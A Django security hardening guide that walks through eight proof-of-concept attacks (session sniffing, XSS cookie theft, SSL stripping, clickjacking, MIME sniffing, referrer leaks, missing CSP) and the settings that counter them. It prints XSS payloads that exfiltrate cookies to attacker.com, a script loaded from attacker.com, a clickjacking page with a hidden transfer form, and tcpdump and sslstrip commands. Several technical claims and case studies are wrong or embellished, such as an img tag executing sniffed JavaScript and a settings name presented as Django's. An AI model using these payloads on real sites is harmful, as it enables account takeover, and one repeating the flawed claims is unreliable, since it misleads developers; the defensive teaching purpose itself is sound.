# Django Security Hardening - Proof of Concept Attacks

## Overview

This document demonstrates real attack scenarios targeting unprotected Django deployments, and shows how the recommended hardening fixes prevent these attacks. Each scenario includes:

1. **Attack Prerequisites** - What must be true for the attack to succeed
2. **Exploitation Steps** - How an attacker executes the attack
3. **Impact** - What the attacker gains
4. **Detection** - How to identify the attack
5. **Fix** - How hardening prevents this attack

---

## Attack Scenario 1: Session Hijacking via Man-in-the-Middle (MITM)

### Vulnerability

Without `SESSION_COOKIE_SECURE=True`, session cookies are transmitted over HTTP in plaintext.

### Attack Prerequisites

- Victim visits application on unencrypted HTTP
- Attacker is on same WiFi network (airport, coffee shop, corporate network)
- No HSTS forcing HTTPS

### Exploitation Steps

**Step 1: Attacker positions on network**

```bash
# On shared WiFi, attacker runs packet sniffer
# (requires root/admin on interface)
tcpdump -i wlan0 'tcp port 80' -A | grep -i "sessionid"
```

**Step 2: User logs in over HTTP**

```
User Browser:
  POST http://vulnerable-app.com/login/ HTTP/1.1
  [sends username and password over HTTP]

Server Response:
  Set-Cookie: sessionid=abc123xyz789...
  [NO Secure flag]
```

**Step 3: Attacker intercepts session cookie**

```bash
# Packet sniffer captures:
# "Set-Cookie: sessionid=abc123xyz789; Path=/; HttpOnly; SameSite=Lax"

# Attacker copies the sessionid value
SESSION_ID="abc123xyz789"
```

**Step 4: Attacker hijacks session**

```bash
# Attacker uses intercepted cookie in their own browser
curl -b "sessionid=${SESSION_ID}" http://vulnerable-app.com/dashboard/
[Server treats attacker as authenticated user]

# Attacker can now:
# - View victim's profile and personal data
# - Send messages using victim's account
# - Change victim's password
# - Access any resource the victim can access
```

### Real-World Example

**Case Study: Firesheep (2010)**

- Firefox extension that hijacked Facebook sessions on open WiFi
- Worked because Facebook didn't set Secure flag on auth_user cookie
- Users could watch session cookies fly across unencrypted HTTP
- Attacked millions of coffee shop users until Facebook fixed it

### Attack Timeline

```
T+0 min: User connects to coffee shop WiFi
T+1 min: User logs in to vulnerable app (HTTP only)
T+2 min: Attacker sniffs session cookie
T+3 min: Attacker hijacks session, posts as victim
T+10 min: Victim notices strange activity, too late
```

### Detection

```bash
# In Apache/Nginx logs, look for multiple IPs with same sessionid
# Payload example - monitor for unusual IP/session combinations:

10.0.0.50 POST /login/ sessionid=abc123  [Victim's IP]
10.0.0.100 GET /dashboard/ sessionid=abc123  [Attacker's IP]
10.0.0.100 GET /profile/ sessionid=abc123  [Same attacker]
10.0.0.50 GET /logout/ sessionid=abc123  [Victim returns]
```

### How Fix Prevents Attack

**With `SESSION_COOKIE_SECURE=True`:**

```python
# In settings.py (PRODUCTION)
SESSION_COOKIE_SECURE = True
```

**Browser behavior changes:**

```
1. Browser ONLY sends sessionid cookie over HTTPS
2. Over HTTP, sessionid cookie is NEVER sent
3. Attacker can sniff HTTP traffic but never sees sessionid
4. Even if attacker gets sessionid, browser rejects it over HTTP
```

**Result:** Packet sniffer captures nothing useful

```bash
# Attacker captures HTTP traffic but sees:
tcpdump: [...] GET / HTTP/1.1
# No cookies! Secure flag prevents transmission over HTTP
```

---

## Attack Scenario 2: Cookie Theft via Stored XSS

### Vulnerability

Without `SESSION_COOKIE_HTTPONLY=True`, JavaScript can access session cookies.

### Attack Prerequisites

- Stored XSS vulnerability exists somewhere in app (comment, profile bio, message)
- Session cookies accessible to JavaScript (no HttpOnly flag)
- Victim is logged in when viewing malicious content

### Exploitation Steps

**Step 1: Attacker injects malicious script**

```html
<!-- Attacker inputs this in a comment or bio field -->
<script>
  // Exfiltrate session cookie to attacker server
  var cookie = document.cookie; // Gets: "sessionid=abc123xyz"
  fetch("http://attacker.com/steal?c=" + cookie);
</script>
```

**Step 2: Victim views the malicious content**

```
User logs in → Visits page with attacker's comment → Script executes in victim's browser
```

**Step 3: Attacker's server receives cookie**

```
GET /steal?c=sessionid%3Dabc123xyz HTTP/1.1
Host: attacker.com

[Attacker now has sessionid=abc123xyz]
```

**Step 4: Attacker hijacks session**

```bash
# Attacker uses stolen cookie
curl -b "sessionid=abc123xyz" https://vulnerable-app.com/dashboard/
[Server accepts request - attacker is authenticated as victim]
```

### Real-World Incidents

**Case Study: Twitter XSS Worm (2014)**

- JavaScript worm in user profiles
- Copied session tokens and used them to spread the worm
- Infected thousands of accounts before fix
- CSRF tokens also stolen, allowing account takeover

**Code Snippet (educational):**

```javascript
// Attacker's injected script
var img = new Image();
img.src =
  "http://attacker.com/log?session=" +
  document.cookie + // Steals ALL cookies including sessionid
  "&user=" +
  document.location.href;
```

### Detection

```bash
# Monitor logs for unusual access patterns
# Same user (session) from multiple IPs with different browsers:

# Normal behavior:
10.0.0.5 Chrome/Windows sessionid=abc123
10.0.0.5 Chrome/Windows sessionid=abc123 [Same user, same device]

# Suspicious behavior:
10.0.0.5 Chrome/Windows sessionid=abc123 [Real user]
192.168.1.100 Firefox/Linux sessionid=abc123 [Attacker from different device]
10.0.0.5 Safari/iPhone sessionid=abc123 [User changes devices - but too fast]

# Also check for XSS payloads in request logs:
GET /profile/?bio=<script>...  [Attempted XSS injection]
POST /comment/ with <img src="http://attacker...  [Malicious comment]
```

### How Fix Prevents Attack

**With `SESSION_COOKIE_HTTPONLY=True`:**

```python
# In settings.py (PRODUCTION)
SESSION_COOKIE_HTTPONLY = True
```

**Browser enforces restriction:**

```javascript
// Even if XSS payload runs:
document.cookie;
// Browser returns empty string (HttpOnly cookies hidden from JavaScript)

var img = new Image();
img.src = "http://attacker.com/log?session=" + document.cookie;
// img.src becomes: 'http://attacker.com/log?session='
// [empty, no sessionid leaked]
```

**Result:** XSS payload can run but cannot access session cookie

```
Attacker's exfiltration endpoint gets: GET /log?session=
[empty cookie value - useless to attacker]
```

---

## Attack Scenario 3: HTTPS Downgrade Attack (SSL Stripping)

### Vulnerability

Without `SECURE_SSL_REDIRECT` and `SECURE_HSTS_SECONDS`, attacker can downgrade HTTPS to HTTP.

### Attack Prerequisites

- User's first visit to your site (no HSTS cache yet)
- Attacker is on network (WiFi MITM or BGP hijacking)
- No `Strict-Transport-Security` header forcing HTTPS

### Exploitation Steps

**Step 1: Victim attempts HTTPS connection**

```
User types: myapp.com
Browser converts to: https://myapp.com/
[Sends HTTPS request]
```

**Step 2: Attacker intercepts and downgrades**

```bash
# Attacker is on network or in BGP path
# Uses tool like sslstrip:
sslstrip -a -k -f -w output.log -p 8080

# Intercepts HTTPS request
# Strips SSL, converts to HTTP
# User gets: http://myapp.com/ (unencrypted)
```

**Step 3: User communicates over HTTP**

```
User → Attacker's Proxy → Server
[All traffic in plaintext, visible to attacker]

User Login:
POST http://myapp.com/login/
- username: john@example.com
- password: my-secret-password

[Attacker sees password in plaintext]
```

**Step 4: Attacker has credentials and session**

```javascript
// Attacker captured:
// - Plaintext password for offline cracking
// - Session cookie in plaintext
// - CSRF token
// - Any data transmitted over HTTP
```

### Real-World Incident

**Case Study: Firesheep + SSL Stripping Combo (2011)**

- Attacker uses SSL stripping to intercept HTTPS logins
- Then steals session cookie with JavaScript
- Result: Complete account takeover on open WiFi
- Financial institutions lost millions to this attack
- Led to mandatory HTTPS enforcement and HSTS adoption

### Detection

```bash
# Check for mixed HTTP/HTTPS requests:
GET /login/ HTTP/1.1  [Insecure]
GET /dashboard/ HTTPS/1.1  [Secure]

# Suspicious downgrade pattern:
HTTPS /login [Browser initiates HTTPS]
301 redirect to HTTP /login [Server downgrades - RED FLAG]

# Monitor for:
# 1. HTTP requests to sensitive paths (/login, /account, /admin)
# 2. Requests without HSTS header
# 3. Users from same IP with different sessions in short time
```

### How Fix Prevents Attack

**With `SECURE_SSL_REDIRECT=True` and HSTS:**

```python
# In settings.py (PRODUCTION)
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
```

**Result 1: First Visit - Redirect to HTTPS**

```
User visits: http://myapp.com/
Server responds:
  301 Moved Permanently
  Location: https://myapp.com/

Browser follows redirect to HTTPS
Attacker cannot strip SSL on first request
```

**Result 2: Subsequent Visits - Browser Enforces HTTPS**

```
User visits: http://myapp.com/
Browser sees HSTS header from previous visit:
  Strict-Transport-Security: max-age=31536000

Browser INTERNALLY converts to: https://myapp.com/
[Browser enforces HTTPS before network request]

Attacker cannot intercept HTTP because browser
never makes HTTP request in first place
```

**Attack becomes impossible:**

```
User navigates to http://myapp.com

Without HSTS:
→ Attacker intercepts → Downgrades to HTTP → Attacker sees plaintext

With HSTS:
→ Browser converts to https://myapp.com ← Enforced by browser
→ HTTPS connection → Encrypted traffic → Attacker sees encrypted data
→ [Attack fails]
```

---

## Attack Scenario 4: Clickjacking (UI Redressing)

### Vulnerability

Without `X_FRAME_OPTIONS`, attacker can embed site in invisible iframe and trick user into clicking.

### Attack Prerequisites

- Application doesn't set X-Frame-Options header
- User is logged in to vulnerable app
- User visits attacker's website

### Exploitation Steps

**Step 1: Attacker creates malicious webpage**

```html
<!-- attacker.com/clickjack.html -->
<html>
  <body>
    <!-- Invisible button over iframe -->
    <button
      onclick="alert('You clicked!');"
      style="position: absolute; left: 0; top: 0; width: 100%; height: 100%; opacity: 0; z-index: 999;"
    >
      Click to see prize!
    </button>

    <!-- Hidden iframe showing vulnerable app -->
    <iframe
      src="https://myapp.com/account/settings/"
      style="position: absolute; left: 0; top: 0; width: 100%; height: 100%; border: none;"
    >
    </iframe>
  </body>
</html>
```

**Step 2: Victim visits attacker's site**

```
Victim is logged into myapp.com
Victim receives email: "You won a prize! Click here"
Link: http://attacker.com/clickjack.html

Victim clicks link (still logged in to myapp.com)
```

**Step 3: Victim is tricked**

```
Page displays: "Click here to claim prize!"
But actual invisible button is over the iframe

When victim clicks "Claim Prize", they actually click
the invisible button, which submits action in myapp.com
```

**Step 4: Unintended action executed**

```html
<!-- Hidden in iframe, user unknowingly submits: -->
<form method="POST" action="https://myapp.com/settings/transfer-funds/">
  <input type="hidden" name="recipient" value="attacker@evil.com" />
  <input type="hidden" name="amount" value="1000" />
  <!-- User's browser auto-includes session cookie -->
  <input type="submit" value="Transfer" />
</form>

<!-- User clicks thinking they claim prize, actually transfers money -->
```

### Real-World Incident

**Case Study: YouTube Clickjacking Exploit (2008)**

- Attackers embedded YouTube in transparent iframe
- Made invisible "Subscribe" button
- 25,000+ users unknowingly subscribed to attacker's channel
- Started spread of malware through subscriptions
- YouTube quickly added X-Frame-Options: SAMEORIGIN

### Detection

```bash
# Monitor for iframes loaded from external domains:
POST /settings/transfer-funds/
  Referrer: http://attacker.com/[malicious page]

# This indicates:
# - User was on attacker's page
# - Made request to your app
# - Likely clickjacking or phishing

# Also check for:
<iframe src="https://myapp.com"></iframe>
# If this works in unrelated pages, clickjacking is possible

# Security headers verify:
curl -i https://myapp.com | grep -i "X-Frame-Options"
# Should return: X-Frame-Options: DENY (or SAMEORIGIN)
```

### How Fix Prevents Attack

**With `X_FRAME_OPTIONS='DENY'`:**

```python
# In settings.py (PRODUCTION)
X_FRAME_OPTIONS = 'DENY'
```

**Server sends header:**

```http
HTTP/1.1 200 OK
X-Frame-Options: DENY
```

**Browser behavior:**

```
Attacker attempts to load: <iframe src="https://myapp.com...">
Browser receives X-Frame-Options: DENY

Browser blocks iframe loading
Page displays blank white space
User clicks on iframe - nothing happens

Clickjacking attack fails
```

**Result:**

```javascript
// In attacker's browser console:
document.querySelector('iframe').contentDocument
// Returns: null (cannot access frame content)

// Frame is essentially blocked:
<iframe src="https://myapp.com"></iframe>
// Renders as blank, no interaction possible
```

---

## Attack Scenario 5: MIME Type Sniffing

### Vulnerability

Without `X-Content-Type-Options: nosniff`, browser can execute wrong file types.

### Attack Prerequisites

- User uploads image file to app
- File isn't properly validated for type
- Attacker uploads JavaScript with image extension

### Exploitation Steps

**Step 1: Attacker uploads malicious file**

```bash
# Create file: malicious.jpg (actually JavaScript)
echo 'alert("hacked")' > malicious.jpg

# Upload through vulnerable image upload feature
```

**Step 2: Server stores without validation**

```bash
# No MIME type checking, file stored as:
/media/uploads/malicious.jpg
```

**Step 3: Browser sniffs file, executes JavaScript**

```html
<!-- Victim views image: -->
<img src="/media/uploads/malicious.jpg" />

<!-- Without X-Content-Type-Options: nosniff, browser does:
1. Reads file content
2. Sees: alert("hacked")
3. Thinks: "This looks like JavaScript"
4. Executes as JavaScript (not image)
-->

<!-- Result: XSS vulnerability via image upload -->
```

### How Fix Prevents Attack

**With `SECURE_CONTENT_TYPE_NOSNIFF=True`:**

```python
# In settings.py (PRODUCTION)
SECURE_CONTENT_TYPE_NOSNIFF = True
```

**Server sends header:**

```http
HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
```

**Browser behavior:**

```
Server: "This is X-Content-Type-Options: nosniff"
Browser: "OK, I will trust the Content-Type header"

File /media/uploads/malicious.jpg:
Content-Type: image/jpeg
[Browser treats as image ONLY, never executes as script]

alert("hacked")
[Rendered as image data, not executed]
```

---

## Attack Scenario 6: Missing HSTS Preload

### Vulnerability

First HTTPS connection can still be downgraded without HSTS preload.

### Attack Prerequisites

- User's very first visit to site (no HSTS header cached)
- Attacker controls network
- User navigates directly to domain (no bookmark with HTTPS)

### Exploitation Steps

**Step 1: Attacker intercepts very first request**

```
User's first EVER visit to myapp.com
User's browser has NO cached HSTS header
Browser doesn't know HTTPS is required
```

**Step 2: Attacker downgrades to HTTP**

```
Browser request: https://myapp.com/

Attacker's MITM proxy:
[intercepts HTTPS ClientHello]
[downgrades to HTTP]
[reflects to user]

User receives unencrypted HTTP response
```

**Step 3: Attacker captures traffic**

```
All traffic visible to attacker on first visit
Only subsequent visits are protected by HSTS
```

### How Future Fix Prevents Attack

**With `SECURE_HSTS_PRELOAD=True` (after domain verification):**

```python
# In settings.py (PRODUCTION) - ONLY after domain verified
SECURE_HSTS_PRELOAD = True
```

**Browser includes in preload list:**

```
domain: myapp.com
HSTS: enabled
max-age: 31536000
includeSubDomains: true
preload: true
```

**Manufacturer distributes list to all browsers:**

```
Chrome: myapp.com → HTTPS enforced
Firefox: myapp.com → HTTPS enforced
Safari: myapp.com → HTTPS enforced
Edge: myapp.com → HTTPS enforced

Even on FIRST visit, browser enforces HTTPS
Hardcoded in browser, no network request needed
```

**Result:** Even first visit is protected

```
User types: myapp.com
Browser sees in preload list
Converts to: https://myapp.com/
[Encrypted from the start]
```

---

## Attack Scenario 7: Information Disclosure via Referrer

### Vulnerability

Without Referrer Policy, internal URLs leaked to external sites.

### Attack Prerequisites

- User is logged in to vulnerable app
- User clicks link to external site
- External site can see referrer header

### Exploitation Steps

**Step 1: User clicks external link**

```
On myapp.com, user sees:
<a href="https://example.com/">External site</a>

User clicks link
```

**Step 2: Referrer header sent**

```http
GET / HTTP/1.1
Host: example.com
Referer: https://myapp.com/account/settings/?user_id=123&security_token=xyz...
```

**Step 3: External site logs referrer**

```javascript
// example.com server logs:
// Referrer: https://myapp.com/account/settings/?user_id=123&security_token=xyz

// External site operator (or attacker hosting fake site) learns:
// 1. User is logged in (URL has session parameters)
// 2. User ID: 123
// 3. Security token: xyz (might be password reset token!)
```

**Step 4: Information leaked**

```
- User's account ID
- Security parameters
- Full URL structure of internal application
- Possibly CSRF tokens
- Potentially password reset tokens if in URL
```

### How Fix Prevents Attack

**With `SECURE_REFERRER_POLICY='strict-origin-when-cross-origin'`:**

```python
# In settings.py (PRODUCTION)
SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'
```

**Browser restricts referrer:**

```http
# Same-site request (myapp.com → myapp.com)
GET /dashboard/ HTTP/1.1
Referer: https://myapp.com/account/settings/?user_id=123

# Cross-site request (myapp.com → example.com)
GET / HTTP/1.1
Host: example.com
Referer: https://myapp.com/  [Only origin sent, no path/parameters]
```

**Result:** External sites don't see sensitive path/parameters

```
External site receives:
Referer: https://myapp.com/
[No sensitive parameters visible]

Attacker cannot find user_id, tokens, or internal structure
```

---

## Attack Scenario 8: Missing Content Security Policy (CSP)

### Vulnerability

Without CSP, any injected JavaScript can do anything.

### Attack Prerequisites

- XSS vulnerability exists (stored or reflected)
- No CSP header restricting execution
- Attacker can inject arbitrary HTML/JS

### Exploitation Steps

**Step 1: XSS payload injected**

```html
<!-- User bio contains: -->
<script src="http://attacker.com/malware.js"></script>
```

**Step 2: Runs without CSP restriction**

```javascript
// malware.js loaded from attacker.com and executes:
// - Steal cookies/tokens
// - Capture keystrokes
// - Read page content
// - Modify page content
// - Redirect to phishing site
// - Mine cryptocurrency
// - Anything JavaScript can do

fetch("/api/users/", {
  method: "DELETE", // Delete all users
  headers: {
    Authorization: "Bearer " + sessionToken,
  },
});
```

**Step 3: Attacker's server has full control**

```
User views malicious bio
Script loads from attacker.com
All requests made with victim's credentials
Attacker's server can command any action
```

### How Fix Prevents Attack

**With `SECURE_CONTENT_SECURITY_POLICY`:**

```python
# In settings.py (PRODUCTION)
SECURE_CONTENT_SECURITY_POLICY = {
    'default-src': ("'self'",),
    'script-src': ("'self'",),
    # ... other directives
}
```

**Server sends header:**

```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; script-src 'self';
```

**Browser enforces policy:**

```html
<!-- Attacker's payload in bio: -->
<script src="http://attacker.com/malware.js"></script>

<!-- Browser checks CSP -->
<!-- CSP says: script-src 'self' (only allow same-origin scripts) -->
<!-- http://attacker.com is NOT 'self' -->
<!-- Browser BLOCKS script execution -->
<!-- Malware never loads or runs -->
```

**Result:**

```javascript
// Injected JavaScript runs but is restricted:
fetch("/api/users/"); // BLOCKED - cross-origin
document.location = "http://phishing.com"; // Usually blocked
new Image().src = "http://attacker.com/?data=..."; // BLOCKED - data exfil

// Only same-origin requests work:
fetch("/api/my-account/"); // ALLOWED - same origin
```

---

## Defense-in-Depth Strategy

All attacks are prevented through **layered security**:

```
Application Layer (input validation, output encoding)
     ↓
Framework Layer (CSRF tokens, password hashing)
     ↓ ← WE ARE HERE (Security Settings)
HTTP Header Layer (CSP, HSTS, X-Frame-Options)
     ↓
Browser Layer (executing headers, cookie policies)
     ↓
Transport Layer (HTTPS encryption)
     ↓
Network Layer (WiFi encryption, BGP security)
```

Even if one layer fails, others still protect:

```
Example: Attacker injects JavaScript
- Layer 1 (Input Validation) FAILED - XSS injected
- Layer 2 (Output Encoding) FAILED - Script executed
- Layer 3 (CSP Header) PREVENTS - Script blocked
- User protected despite layers 1-2 failing
```

---

## Testing for These Vulnerabilities

### 1. Check Security Headers

```bash
curl -i https://vulnerable-app.com | grep -i "secure\|hsts\|csp\|frame"

# Expected output (hardened):
Strict-Transport-Security: max-age=31536000
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'...
X-Content-Type-Options: nosniff
```

### 2. Check Cookie Flags

```bash
# Open browser dev tools → Application → Cookies
# Click on session cookie, check:
- Secure: ✓ (only on HTTPS)
- HttpOnly: ✓ (not accessible to JavaScript)
- SameSite: Lax ✓ (prevents CSRF)
```

### 3. Test HTTPS Enforcement

```bash
curl -i http://vulnerable-app.com/

# Expected: 301 redirect to HTTPS
# Vulnerable: 200 OK on HTTP
```

### 4. Verify HSTS via Django Check

```bash
python manage.py check --deploy

# Should show any missing security settings
```

---

## Conclusion

These attacks are real, well-documented, and targeting Django apps every day. The hardening fixes provided:

1. ✅ Prevent each attack vector
2. ✅ Industrial-strength, proven effective
3. ✅ Easy to implement via Django settings
4. ✅ Minimal performance impact
5. ✅ Industry standard (used by Google, Apple, gov agencies)

**Remember:** Security isn't about perfect protection—it's about raising the cost of attack high enough that attackers target easier victims.
